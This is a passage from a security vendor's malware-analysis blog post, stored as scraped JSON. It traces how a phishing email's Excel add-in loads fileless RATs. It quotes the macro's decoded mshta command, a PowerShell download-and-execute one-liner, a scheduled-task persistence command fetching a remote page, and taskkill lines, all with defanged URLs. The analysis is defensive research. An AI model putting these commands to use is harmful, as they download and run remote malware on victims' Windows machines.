{
    "id": "<report_0x5b3b01cd>",
    "url": "https://www.fortinet.com/blog/threat-research/phishing-campaign-delivering-fileless-malware",
    "title": "Phishing Campaign Delivering Three Fileless Malware: AveMariaRAT / BitRAT / PandoraHVNC Part I",
    "meta": [
        {
            "id": "<chapter_0xb3a84bac>",
            "title": "Phishing Campaign Delivering Three Fileless Malware: AveMariaRAT / BitRAT / PandoraHVNC Part I",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0x76a01211>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "By",
                    "html": "\nBy \n"
                },
                {
                    "id": "<sentence_0x9734cf69>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x87cd68e7>": "https://www.fortinet.com/blog/search?author=Xiaopeng+Zhang"
                    },
                    "text": "Xiaopeng Zhang",
                    "html": "<a href=\"/blog/search?author=Xiaopeng+Zhang\">Xiaopeng Zhang</a>"
                },
                {
                    "id": "<sentence_0x5df2e29f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "| May 12, 2022",
                    "html": "\n | May 12, 2022\n"
                },
                {
                    "id": "<sentence_0x82883fbb>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Observing the Phishing Email",
                    "html": "<p>Observing the Phishing Email</p>"
                },
                {
                    "id": "<sentence_0x31c5a013>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Looking into the Attached Excel Document",
                    "html": "<p>Looking into the Attached Excel Document</p>"
                },
                {
                    "id": "<sentence_0xdd18af7a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "HTML + JavaScript + PowerShell",
                    "html": "<p>HTML + JavaScript + PowerShell</p>"
                },
                {
                    "id": "<sentence_0xf06bbf80>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Dynamic .Net Module for Process Hollowing",
                    "html": "<p>Dynamic .Net Module for Process Hollowing</p>"
                },
                {
                    "id": "<sentence_0xee341a47>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Conclusion",
                    "html": "<p>Conclusion</p>"
                },
                {
                    "id": "<sentence_0x24a36bc6>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Fortinet Protections",
                    "html": "<p>Fortinet Protections</p>"
                },
                {
                    "id": "<sentence_0x12146380>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "IOCs",
                    "html": "<p>IOCs</p>"
                },
                {
                    "id": "<sentence_0x29f9918e>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "URLs:",
                    "html": "<p>URLs:</p>"
                },
                {
                    "id": "<sentence_0x2f4cc5b2>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Sample SHA-256 Involved in the Campaign:",
                    "html": "<p>Sample SHA-256 Involved in the Campaign:</p>"
                },
                {
                    "id": "<sentence_0x36746942>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Tags:",
                    "html": "\nTags:\n"
                },
                {
                    "id": "<sentence_0xacf0ad77>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x5ad16940>": "https://www.fortinet.com/blog/tags-search.html?tag=phishing",
                        "<a_0xeab411b9>": "https://www.fortinet.com/blog/tags-search.html?tag=malware",
                        "<a_0x9fbc5cef>": "https://www.fortinet.com/blog/tags-search.html?tag=threat-analysis"
                    },
                    "text": "phishing,<crlf><crlf>malware,<crlf><crlf>threat analysis",
                    "html": "<p class=\"b16-blog-tags__tag-links\">\n<a href=\"https://www.fortinet.com/blog/tags-search.html?tag=phishing\">phishing</a>, \n \n <a href=\"https://www.fortinet.com/blog/tags-search.html?tag=malware\">malware</a>, \n \n <a href=\"https://www.fortinet.com/blog/tags-search.html?tag=threat-analysis\">threat analysis</a>\n</p>"
                },
                {
                    "id": "<sentence_0x4dd4439d>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Related Posts",
                    "html": "<p>Related Posts</p>"
                },
                {
                    "id": "<sentence_0x6012ea1d>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x1406216b>": "https://www.fortinet.com/blog/threat-research/the-increasing-wiper-malware-threat",
                        "<img_0xc58259de>": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAQAAAAe/WZNAAAADklEQVR42mNkgAJGDAYAAFEABCaLYqoAAAAASUVORK5CYII="
                    },
                    "text": "Threat Research<crlf><crlf>An Overview of the Increasing Wiper Malware Threat",
                    "html": "<a class=\"b12-related__post b12-related__post-0\" href=\"/blog/threat-research/the-increasing-wiper-malware-threat\">\n<img alt=\"An Overview of the Increasing Wiper Malware Threat\" class=\"ratio\" src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAQAAAAe/WZNAAAADklEQVR42mNkgAJGDAYAAFEABCaLYqoAAAAASUVORK5CYII=\"/>\n<p class=\"b12-related__category\">\n Threat Research\n </p>\n<h5 class=\"b12-related__title\">An Overview of the Increasing Wiper Malware Threat</h5>\n</a>"
                },
                {
                    "id": "<sentence_0x467113ad>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x7ff7db67>": "https://www.fortinet.com/blog/threat-research/Trends-in-the-recent-emotet-maldoc-outbreak",
                        "<img_0xc58259de>": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAQAAAAe/WZNAAAADklEQVR42mNkgAJGDAYAAFEABCaLYqoAAAAASUVORK5CYII="
                    },
                    "text": "Threat Research<crlf><crlf>Trends in the Recent Emotet Maldoc Outbreak",
                    "html": "<a class=\"b12-related__post b12-related__post-1\" href=\"/blog/threat-research/Trends-in-the-recent-emotet-maldoc-outbreak\">\n<img alt=\"Trends in the Recent Emotet Maldoc Outbreak\" class=\"ratio\" src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAQAAAAe/WZNAAAADklEQVR42mNkgAJGDAYAAFEABCaLYqoAAAAASUVORK5CYII=\"/>\n<p class=\"b12-related__category\">\n Threat Research\n </p>\n<h5 class=\"b12-related__title\">Trends in the Recent Emotet Maldoc Outbreak</h5>\n</a>"
                },
                {
                    "id": "<sentence_0x9f97bc9b>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x9826b073>": "https://www.fortinet.com/blog/threat-research/enemybot-a-look-into-keksecs-latest-ddos-botnet",
                        "<img_0xc58259de>": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAQAAAAe/WZNAAAADklEQVR42mNkgAJGDAYAAFEABCaLYqoAAAAASUVORK5CYII="
                    },
                    "text": "Threat Research<crlf><crlf>Enemybot: A Look into Keksec's Latest DDoS Botnet",
                    "html": "<a class=\"b12-related__post b12-related__post-2\" href=\"/blog/threat-research/enemybot-a-look-into-keksecs-latest-ddos-botnet\">\n<img alt=\"Enemybot: A Look into Keksec's Latest DDoS Botnet\" class=\"ratio\" src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAQAAAAe/WZNAAAADklEQVR42mNkgAJGDAYAAFEABCaLYqoAAAAASUVORK5CYII=\"/>\n<p class=\"b12-related__category\">\n Threat Research\n </p>\n<h5 class=\"b12-related__title\">Enemybot: A Look into Keksec's Latest DDoS Botnet</h5>\n</a>"
                },
                {
                    "id": "<sentence_0x1ef64281>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0xbce9ab26>": "https://www.fortinet.com",
                        "<img_0xcbc571e1>": "https://www.fortinet.com/content/dam/fortinet-blog/fortinet-logo-white.svg"
                    },
                    "text": "",
                    "html": "<a href=\"https://www.fortinet.com\" target=\"_blank\">\n<img alt=\"Fortinet\" src=\"/content/dam/fortinet-blog/fortinet-logo-white.svg\"/>\n</a>"
                },
                {
                    "id": "<sentence_0xfbddd3ef>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0x23535518>": "https://www.facebook.com/fortinet",
                        "<a_0xc694baba>": "https://www.twitter.com/fortinet",
                        "<a_0xff5519a1>": "https://www.youtube.com/user/SecureNetworks",
                        "<a_0x93053e4d>": "https://www.linkedin.com/company/fortinet",
                        "<a_0xf470e127>": "https://www.instagram.com/behindthefirewall/",
                        "<a_0x598584d8>": "https://www.fortinet.com/rss-feeds.html"
                    },
                    "text": "",
                    "html": "<ul>\n<li class=\"social-icon facebook\">\n<a href=\"https://www.facebook.com/fortinet\" target=\"_blank\">\n</a>\n</li>\n<li class=\"social-icon twitter\">\n<a href=\"https://www.twitter.com/fortinet\" target=\"_blank\">\n</a>\n</li>\n<li class=\"social-icon youtube\">\n<a href=\"https://www.youtube.com/user/SecureNetworks\" target=\"_blank\">\n</a>\n</li>\n<li class=\"social-icon linkedin\">\n<a href=\"https://www.linkedin.com/company/fortinet\" target=\"_blank\">\n</a>\n</li>\n<li class=\"social-icon instagram\">\n<a href=\"https://www.instagram.com/behindthefirewall/\" target=\"_blank\">\n</a>\n</li>\n<li class=\"social-icon rss\">\n<a href=\"https://www.fortinet.com/rss-feeds.html\" target=\"_blank\">\n</a>\n</li>\n</ul>"
                },
                {
                    "id": "<sentence_0x2b62403f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "News & Articles",
                    "html": "<p class=\"b6-footer__header\">News &amp; Articles</p>"
                },
                {
                    "id": "<sentence_0x69f7aa52>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x94f49ef8>": "https://www.fortinet.com/corporate/about-us/newsroom/press-releases.html",
                        "<a_0xeb0626ee>": "https://www.fortinet.com/corporate/about-us/newsroom/news.html",
                        "<a_0xbabb4d46>": "https://www.fortinet.com/corporate/about-us/contact-us/fortinet-trademark-guidelines.html"
                    },
                    "text": "News Releases<crlf>News Articles<crlf>Trademarks",
                    "html": "<ul>\n<li>\n<a href=\"https://www.fortinet.com/corporate/about-us/newsroom/press-releases.html\" target=\"_self\">News Releases</a>\n</li>\n<li>\n<a href=\"https://www.fortinet.com/corporate/about-us/newsroom/news.html\" target=\"_blank\">News Articles</a>\n</li>\n<li>\n<a href=\"https://www.fortinet.com/corporate/about-us/contact-us/fortinet-trademark-guidelines.html\" target=\"_self\">Trademarks</a>\n</li>\n</ul>"
                },
                {
                    "id": "<sentence_0xa0458b79>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Security Research",
                    "html": "<p class=\"b6-footer__header\">Security Research</p>"
                },
                {
                    "id": "<sentence_0x382f9414>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x507b6b33>": "https://www.fortinet.com/fortiguard/threat-intelligence/threat-research.html",
                        "<a_0x9950fb5d>": "https://fortiguard.com/",
                        "<a_0x58195f15>": "https://www.fortinet.com/fortiguard/threat-intelligence/threat-map.html",
                        "<a_0x9f1b6394>": "https://secure.fortinet.com/fortiguard",
                        "<a_0x7328961a>": "https://www.fortinet.com/solutions/ransomware.html"
                    },
                    "text": "Threat Research<crlf>FortiGuard Labs<crlf>Threat Map<crlf>Threat Briefs<crlf>Ransomware",
                    "html": "<ul>\n<li>\n<a href=\"https://www.fortinet.com/fortiguard/threat-intelligence/threat-research.html\" target=\"_self\">Threat Research</a>\n</li>\n<li>\n<a href=\"https://fortiguard.com/\" target=\"_self\">FortiGuard Labs</a>\n</li>\n<li>\n<a href=\"https://www.fortinet.com/fortiguard/threat-intelligence/threat-map.html\" target=\"_self\">Threat Map</a>\n</li>\n<li>\n<a href=\"https://secure.fortinet.com/fortiguard\" target=\"_blank\">Threat Briefs</a>\n</li>\n<li>\n<a href=\"https://www.fortinet.com/solutions/ransomware.html\" target=\"_self\">Ransomware</a>\n</li>\n</ul>"
                },
                {
                    "id": "<sentence_0x91f18230>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Connect With Us",
                    "html": "<p class=\"b6-footer__header\">Connect With Us</p>"
                },
                {
                    "id": "<sentence_0x2278ea30>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x128f927e>": "https://www.fortinet.com/content/fortinet-blog/us/en",
                        "<a_0x17ff780>": "https://fusecommunity.fortinet.com"
                    },
                    "text": "Blog<crlf>Fuse Community",
                    "html": "<ul>\n<li>\n<a href=\"/content/fortinet-blog/us/en\" target=\"_self\">Blog</a>\n</li>\n<li>\n<a href=\"https://fusecommunity.fortinet.com\" target=\"_self\">Fuse Community</a>\n</li>\n</ul>"
                },
                {
                    "id": "<sentence_0x666c14ca>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Company",
                    "html": "<p class=\"b6-footer__header\">Company</p>"
                },
                {
                    "id": "<sentence_0xc6917023>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x1fb2ec06>": "https://www.fortinet.com/corporate/about-us/about-us",
                        "<a_0xaf4143fe>": "https://www.fortinet.com/corporate/about-us/why-fortinet",
                        "<a_0x517a318c>": "https://www.fortinet.com/corporate/about-us/security-fabric",
                        "<a_0x55cd946c>": "https://www.fortinet.com/corporate/about-us/executive-management",
                        "<a_0x2c711912>": "https://www.fortinet.com/corporate/careers",
                        "<a_0x11f5005>": "https://www.fortinet.com/corporate/about-us/product-certifications",
                        "<a_0xff8048f9>": "https://www.fortinet.com/corporate/about-us/events",
                        "<a_0x99816497>": "https://www.fortinet.com/corporate/about-us/industry-awards",
                        "<a_0xbb4ffed0>": "https://www.fortinet.com/sitemap",
                        "<a_0x18aa7137>": "https://www.fortinet.com/blog/blog-sitemap"
                    },
                    "text": "About Us<crlf>Why Fortinet<crlf>Security Fabric<crlf>Exec Mgmt<crlf>Careers<crlf>Certifications<crlf>Events<crlf>Industry Awards<crlf>Sitemap<crlf>Blog Sitemap",
                    "html": "<ul>\n<li>\n<a href=\"https://www.fortinet.com/corporate/about-us/about-us\" target=\"_blank\">About Us</a>\n</li>\n<li>\n<a href=\"https://www.fortinet.com/corporate/about-us/why-fortinet\" target=\"_blank\">Why Fortinet</a>\n</li>\n<li>\n<a href=\"https://www.fortinet.com/corporate/about-us/security-fabric\" target=\"_self\">Security Fabric</a>\n</li>\n<li>\n<a href=\"https://www.fortinet.com/corporate/about-us/executive-management\" target=\"_self\">Exec Mgmt</a>\n</li>\n<li>\n<a href=\"https://www.fortinet.com/corporate/careers\" target=\"_self\">Careers</a>\n</li>\n<li>\n<a href=\"https://www.fortinet.com/corporate/about-us/product-certifications\" target=\"_self\">Certifications</a>\n</li>\n<li>\n<a href=\"https://www.fortinet.com/corporate/about-us/events\" target=\"_self\">Events</a>\n</li>\n<li>\n<a href=\"https://www.fortinet.com/corporate/about-us/industry-awards\" target=\"_self\">Industry Awards</a>\n</li>\n<li>\n<a href=\"https://www.fortinet.com/sitemap\" target=\"_self\">Sitemap</a>\n</li>\n<li>\n<a href=\"https://www.fortinet.com/blog/blog-sitemap\" target=\"_self\">Blog Sitemap</a>\n</li>\n</ul>"
                },
                {
                    "id": "<sentence_0x1e33acf2>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Contact Us",
                    "html": "<p class=\"b6-footer__header\">Contact Us</p>"
                },
                {
                    "id": "<sentence_0x4054c70c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "(866) 868-3678",
                    "html": "<ul>\n<li>(866) 868-3678</li>\n</ul>"
                },
                {
                    "id": "<sentence_0xa67246ae>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Copyright 2022 Fortinet, Inc. All Rights Reserved",
                    "html": "<p class=\"b6-footer__copyright-text\">Copyright \u00a9 2022 Fortinet, Inc. All Rights Reserved</p>"
                },
                {
                    "id": "<sentence_0x407b4d18>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x2e677a4b>": "https://www.fortinet.com/corporate/about-us/legal.html"
                    },
                    "text": "Terms of Services",
                    "html": "<a class=\"b6-footer__copyright-link\" href=\"https://www.fortinet.com/corporate/about-us/legal.html\" target=\"_blank\">Terms of Services</a>"
                },
                {
                    "id": "<sentence_0x44e58e6f>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x23aed252>": "https://www.fortinet.com/corporate/about-us/privacy.html"
                    },
                    "text": "Privacy Policy",
                    "html": "<a class=\"b6-footer__copyright-link\" href=\"https://www.fortinet.com/corporate/about-us/privacy.html\" target=\"_blank\">Privacy Policy</a>"
                },
                {
                    "id": "<sentence_0x51bdeb27>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "|",
                    "html": "\n | "
                },
                {
                    "id": "<sentence_0x83d71705>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"#\">Cookie Settings</a>"
                }
            ]
        }
    ],
    "chapters": [
        {
            "id": "<chapter_0x2604c888>",
            "title": "Phishing Campaign Delivering Three Fileless Malware: AveMariaRAT / BitRAT / PandoraHVNC Part I",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0xcbf3badc>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Fortinets FortiGuard Labs captured a phishing campaign that was delivering three fileless malware onto a victims device. Once executed, they are able to steal sensitive information from that device.",
                    "html": "<p>Fortinet\u2019s FortiGuard Labs captured a phishing campaign that was delivering three fileless malware onto a victim\u2019s device. Once executed, they are able to steal sensitive information from that device.\n</p>"
                },
                {
                    "id": "<sentence_0x4664599c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "In this analysis, Ill reveal how the phishing campaign manages to transfer the fileless malware to the victims device, what mechanism it uses to load, deploy, and execute the fileless malware in the target process, and how it maintains persistence on the victims device.",
                    "html": "<p>In this analysis, I\u2019ll reveal how the phishing campaign manages to transfer the fileless malware to the victim\u2019s device, what mechanism it uses to load, deploy, and execute the fileless malware in the target process, and how it maintains persistence on the victim\u2019s device.</p>"
                },
                {
                    "id": "<sentence_0xb4d39ded>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Affected platforms: Microsoft Windows<crlf>Impacted parties: Microsoft Windows Users<crlf>Impact: Controls victims device and collects sensitive information<crlf>Severity level: Critical",
                    "html": "<p>Affected platforms: Microsoft Windows\nImpacted parties: Microsoft Windows Users\nImpact: Controls victim\u2019s device and collects sensitive information\nSeverity level: Critical\n</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x7743e55e>",
            "title": "Observing the Phishing Email",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x3d79bb6b>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x710654d7>": "https://www.fortinet.com/resources/cyberglossary/phishing?utm_source=blog&utm_campaign=phishing"
                    },
                    "text": "The captured phishing email is shown in Figure 1.1. It was disguised as a notification of a payment report from a trusted source.",
                    "html": "<p>The captured <a href=\"https://www.fortinet.com/resources/cyberglossary/phishing?utm_source=blog&amp;utm_campaign=phishing\">phishing</a> email is shown in Figure 1.1. It was disguised as a notification of a payment report from a trusted source. </p>"
                },
                {
                    "id": "<sentence_0xc17a3fd9>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x68c0688d>": "https://marvel-b1-cdn.bc0a.com/f00000000216283/www.fortinet.com/blog/threat-research/phishing-campaign-delivering-fileless-malware/_jcr_content/root/responsivegrid/image.img.png/1652300705505/fig1.1..png"
                    },
                    "text": "",
                    "html": "<img alt=\"phishing email example\" class=\"\" src=\"https://marvel-b1-cdn.bc0a.com/f00000000216283/www.fortinet.com/blog/threat-research/phishing-campaign-delivering-fileless-malware/_jcr_content/root/responsivegrid/image.img.png/1652300705505/fig1.1..png\"/>"
                },
                {
                    "id": "<sentence_0xc5ff4d69>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Figure 1.1 The phishing email",
                    "html": "\n Figure 1.1 \u2013 The phishing email\n"
                },
                {
                    "id": "<sentence_0x5a90efce>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xbffc1f08>": "https://www.fortinet.com/products/email-security/fortimail.html?utm_source=blog&utm_campaign=fortimail-main-page"
                    },
                    "text": "This email attempts to trick the recipient into opening the attached Excel document for the report detail. As you can see, this phishing email is detected as spam by the FortiMail service and has been marked as [SPAM detected by FortiMail] in the Subject line to warn the recipient.",
                    "html": "<p>This email attempts to trick the recipient into opening the attached Excel document for the report detail. As you can see, this phishing email is detected as spam by the <a href=\"https://www.fortinet.com/products/email-security/fortimail.html?utm_source=blog&amp;utm_campaign=fortimail-main-page\">FortiMail</a> service and has been marked as \u201c[SPAM detected by FortiMail]\u201d in the Subject line to warn the recipient.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x2efe6bd4>",
            "title": "Looking into the Attached Excel Document",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x8878f48c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The Excel document is named Remittance-Details-951244.xlam. Its an Excel Add-In (*.xlam) file that contains malicious macros. When the recipient starts it in the Microsoft Excel program, a security notice pops up asking the user if they want to enable the macros, as shown in Figure 2.1.",
                    "html": "<p>The Excel document is named \u201cRemittance-Details-951244.xlam\u201d. It\u2019s an Excel Add-In (*.xlam) file that contains malicious macros. When the recipient starts it in the Microsoft Excel program, a security notice pops up asking the user if they want to enable the macros, as shown in Figure 2.1. </p>"
                },
                {
                    "id": "<sentence_0x7ef07d29>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x60fd8108>": "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
                    },
                    "text": "",
                    "html": "<img alt=\"Screenshot of the security notice that launches when opening the Excel document\" class=\"loading\" src=\"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\"/>"
                },
                {
                    "id": "<sentence_0x106a6125>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Figure 2.1 The security notice that launches when opening the Excel document",
                    "html": "\n Figure 2.1 \u2013 The security notice that launches when opening the Excel document\n"
                },
                {
                    "id": "<sentence_0x794e9f6c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "It contains an auto-start Macro that starts using a VBA (Visual Basic Application) method called Auto_Open() when the Excel file is opened.",
                    "html": "<p>It contains an auto-start Macro that starts using a VBA (Visual Basic Application) method called \u201cAuto_Open()\u201d when the Excel file is opened.</p>"
                },
                {
                    "id": "<sentence_0x1c5b5ddc>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x8e48c9e9>": "https://docs.microsoft.com/en-us/windows/win32/wmisdk/retrieving-a-class"
                    },
                    "text": "Going through the VBA code inside the method, I learned that it decodes a command string and executes it using a WMI (Windows Management Instrumentation) object.",
                    "html": "<p>Going through the VBA code inside the method, I learned that it decodes a command string and executes it using a <a href=\"https://docs.microsoft.com/en-us/windows/win32/wmisdk/retrieving-a-class\" target=\"_blank\">WMI</a> (Windows Management Instrumentation) object.</p>"
                },
                {
                    "id": "<sentence_0xff990877>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x60fd8108>": "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
                    },
                    "text": "",
                    "html": "<img alt=\"Example of The WMI object used to execute a decoded command\" class=\"loading\" src=\"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\"/>"
                },
                {
                    "id": "<sentence_0xfeb8883a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Figure 2.2 The WMI object used to execute a decoded command",
                    "html": "\n Figure 2.2 \u2013 The WMI object used to execute a decoded command\n"
                },
                {
                    "id": "<sentence_0xbaad8345>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Figure 2.2 is a snippet of VBA code of the method Auto_Open(), showing where it is about to create a WMI object to execute the decoded string command C:\\\\ProgramData\\\\ddond.com hxxps://taxfile[.]mediafire[.]com/file/6hxdxdkgeyq0z1o/APRL27[.]htm/file, as shown in the bottom of Figure 2.2.",
                    "html": "<p>Figure 2.2 is a snippet of VBA code of the method \u201cAuto_Open()\u201d, showing where it is about to create a WMI object to execute the decoded string command \u201cC:\\\\ProgramData\\\\ddond.com hxxps://taxfile[.]mediafire[.]com/file/6hxdxdkgeyq0z1o/APRL27[.]htm/file\u201d, as shown in the bottom of Figure 2.2.</p>"
                },
                {
                    "id": "<sentence_0x3094765d>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Before that, it copies a local file, C:\\Windows\\System32\\mshta.exe, into C:\\ProgramData\\ and renames it as ddond.com. mshta.exe is a Windows-native binary file designed to execute Microsoft HTML Application (HTA) files. Remember that C:\\ProgramData\\ddond.com is now the duplicate of mshta.exe, which will be used throughout the campaign. To confuse researchers, for example, it uses the copied ddond.com file to download and execute the malicious html file rather than mshta.exe.",
                    "html": "<p>Before that, it copies a local file, \u201cC:\\Windows\\System32\\mshta.exe\u201d, into \u201cC:\\ProgramData\\\u201d and renames it as \u201cddond.com\u201d. \u201cmshta.exe\u201d is a Windows-native binary file designed to execute Microsoft HTML Application (HTA) files. Remember that \u201cC:\\ProgramData\\ddond.com\u201d is now the duplicate of \u201cmshta.exe\u201d, which will be used throughout the campaign. To confuse researchers, for example, it uses the copied \u201cddond.com\u201d file to download and execute the malicious html file rather than \u201cmshta.exe\u201d.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x1f041d8>",
            "title": "HTML + JavaScript + PowerShell",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xf8add4a6>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "It downloads the APRL27.htm file, which is parsed by ddond.com (i.e. mshta.exe). The HTML file contains a piece of JavaScript code that is encoded using the URL escape method. I decoded it and simplified the code, as shown in Figure 3.1.",
                    "html": "<p>It downloads the \u201cAPRL27.htm\u201d file, which is parsed by \u201cddond.com\u201d (i.e. \u201cmshta.exe\u201d). The HTML file contains a piece of JavaScript code that is encoded using the URL escape method. I decoded it and simplified the code, as shown in Figure 3.1.</p>"
                },
                {
                    "id": "<sentence_0xfcf4ef66>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x60fd8108>": "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
                    },
                    "text": "",
                    "html": "<img alt=\"screenshot of The simplified JavaScript code from APRL27.html\" class=\"loading\" src=\"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\"/>"
                },
                {
                    "id": "<sentence_0x772b1c4d>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Figure 3.1 - The simplified JavaScript code from APRL27.html",
                    "html": "\n Figure 3.1 - The simplified JavaScript code from APRL27.html\n"
                },
                {
                    "id": "<sentence_0xd67302af>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "It creates an object, Wscript.Shell, using the instruction below. Wscript.Shell is retrieved using method _0x5b4b3f(0x391, 0x391), which is used to return a string by its index.",
                    "html": "<p>It creates an object, \u201cWscript.Shell\u201d, using the instruction below. \u201cWscript.Shell\u201d is retrieved using method \u201c_0x5b4b3f(0x391, 0x391)\u201d, which is used to return a string by its index.</p>"
                },
                {
                    "id": "<sentence_0x881a73c9>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "chuchukukukaokiwDasidow = new ActiveXObject(_0x5b4b3f(0x391, 0x391));",
                    "html": "<p>chuchukukukaokiwDasidow = new ActiveXObject(_0x5b4b3f(0x391, 0x391));</p>"
                },
                {
                    "id": "<sentence_0xe9772a24>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "chuchukukukaokiwDasidow is the created OS Shell object used to run an application. In Figure 3.1 we can see it runs five command-line applications, as follows.",
                    "html": "<p>\u201cchuchukukukaokiwDasidow\u201d is the created OS Shell object used to run an application. In Figure 3.1 we can see it runs five command-line applications, as follows.</p>"
                },
                {
                    "id": "<sentence_0xbdd74328>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "powershell $MMMMMMM=((neW-ObjEcT ((\"Net.Webclient\"))).((\"Downloadstring\")).invoke(((\"hxxps[:]//taxfile[.]mediafire.com/file/175lr9wsa5n97x8/mainpw.dll/file\"))));Invoke-Expression $MMMMMMM<crlf>schtasks /create /sc MINUTE /mo 82 /tn calendersw /F /tr \"\"\"%programdata%\\ddond.com \"\"\"\"\"\" hxxps[:]//www[.]mediafire.com/file/c3zcoq7ay6nql9i/back.htm/file\"\"\"<crlf>taskkill /f /im WinWord.exe<crlf>taskkill /f /im Excel.exe<crlf>taskkill /f /im POWERPNT.exe",
